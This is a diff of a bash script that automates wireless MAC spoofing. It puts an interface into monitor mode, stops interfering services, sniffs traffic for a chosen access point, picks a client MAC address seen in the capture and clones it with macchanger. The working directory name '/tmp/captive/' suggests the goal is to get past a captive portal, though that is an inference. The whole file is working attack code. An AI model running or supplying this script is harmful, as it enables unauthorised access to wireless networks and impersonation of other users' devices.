@@ -1,83 +1,81 @@
 #!/bin/bash
 
+function check_command {
+    if ! command -v "$1" >/dev/null 2>&1 ; then
+        echo "$1 not found!"
+        exit 1
+    else
+        echo "$1 found!"
+    fi
+}
+
+# check if root
+if [ "$EUID" -ne 0 ]; then
+    echo "Please run as root"
+    exit
+fi
+
 # Check if macchanger is installed
-if ! command -v macchanger >/dev/null 2>&1 ; then
-    echo "macchanger not found!"
-    exit 1
-else
-    echo "macchanger found!"
-fi
-echo ''
+check_command macchanger
+# the aircrack package provides airmon-ng, airodump-ng, and other tools
+check_command aircrack-ng
+check_command iwlist
+check_command tshark
 
-# Check if airodump-ng is installed
-if ! command -v airodump-ng >/dev/null 2>&1 ; then
-    echo "airodump-ng not found!"
-    exit 1
-else
-    echo "airodump-ng found!"
-fi
-echo ''
+select interface in $(airmon-ng | awk 'NR>2 {print $2}'); do
+    break
+done
 
-# Display network interfaces
-sudo ip link show
+echo scanning for networks
+IFS=$'\n'
+select target in $(iwlist $interface scanning | awk '/Address/ {bssid=$5} /ESSID/ {split($1,arr,":"); print bssid, arr[2]}')
+do
+    bssid=$(echo $target | awk '{print $1}')
+    echo "Selected BSSID: $bssid"
+    break
+done
+unset IFS
 
-# Prompt the user to enter a network interface name
-read -p 'Enter Network interface name: ' NIC
+# check for processes that might interfere with the script
 
-# Check if the entered interface exists
-if ! ip link show "$NIC" >/dev/null 2>&1; then
-    echo "Interface $NIC does not exist!"
-    exit 1
-fi
+readarray -t services < <(airmon-ng check | awk '/.*PID.*Name/{header=1;next;} (header && length($2) > 0) {print $2};' | sort | uniq)
 
-# Set the specified interface down
-echo "Setting $NIC interface down..."
-sudo ifconfig "$NIC" down
+# stop services
+for service in "${services[@]}"; do
+    echo "Stopping $service..."
+    sudo systemctl stop "$service"
+done
 
-# Set the interface to monitor mode
-echo "Setting $NIC interface to monitor mode..."
-sudo iwconfig "$NIC" mode monitor
+# kill any stragglers
+airmon-ng check kill > /dev/null
 
-# Bring the interface up
-echo "Bringing $NIC interface up..."
-sudo ifconfig "$NIC" up
+airmon-ng start "$interface"
 
-# Display the current configuration of the interface
-echo "Current configuration of $NIC interface:"
-sudo iwconfig "$NIC"
+#setup trap to restart services
+trap 'airmon-ng stop ${interface}mon; for service in "${services[@]}"; do echo "Starting $service..."; sudo systemctl start "$service";  done' EXIT
 
-# Run airodump-ng to capture network data for 2 minutes
+
+echo "Creating temporary working directory..."
+temporary_directory="/tmp/captive/" # $mktemp -d)
+
+cd $temporary_directory
+pwd
+
+# # Run airodump-ng to capture network data for 2 minutes
 echo "Running airodump-ng to capture network data..."
-sudo timeout 2m airodump-ng -w output --output --format csv "$NIC" &
+sudo timeout 10s airodump-ng --write output --output-format pcap --bssid $bssid ${interface}mon 
+latest_packet_file=$(ls -t output*.cap | head -n 1)
+IFS=$'\n'
+select mac_options in $(tshark -r ./${latest_packet_file} -T fields -e wlan.sa 2>/dev/null | grep -v '^$' | sort | uniq -c | head | sort -rnk 1)
+do
+    echo $mac_options
+    new_mac=$(echo $mac_options | awk '{print $2}')
+    break
+done
+unset IFS
 
-# Sleep for a moment to ensure airodump-ng starts capturing
-sleep 5
-
-# Run arp-scan to find MAC addresses on the network
-echo "Scanning for MAC addresses on the network..."
-sudo arp-scan --interface="$NIC" --localnet
-
-# Monitor bandwidth usage with iftop
-echo "Monitoring bandwidth usage on $NIC interface..."
-sudo iftop -i "$NIC"
-
-# Prompt the user to enter a MAC address to change
-read -p 'Enter MAC address you want to use (Format "xx:xx:xx:xx:xx:xx"): ' MAC
-
-# Change the MAC address of the interface
-echo "Changing MAC address of $NIC interface to $MAC..."
-sudo macchanger -m "$MAC" "$NIC"
-
-# Set the interface back to managed mode
-echo "Setting $NIC interface back to managed mode..."
-sudo iwconfig "$NIC" mode managed
-
-# Bring the interface up again
-echo "Bringing $NIC interface up again..."
-sudo ifconfig "$NIC" up
-
-# Display the updated configuration
-echo "Updated configuration of $NIC interface:"
-iwconfig "$NIC"
-ifconfig "$NIC"
-
+airmon-ng stop "${interface}mon"
+echo "Changing MAC address of ${interface} interface to $new_mac..."
+ifconfig $interface down
+macchanger -m "$new_mac" "${interface}"
+ifconfig $interface up
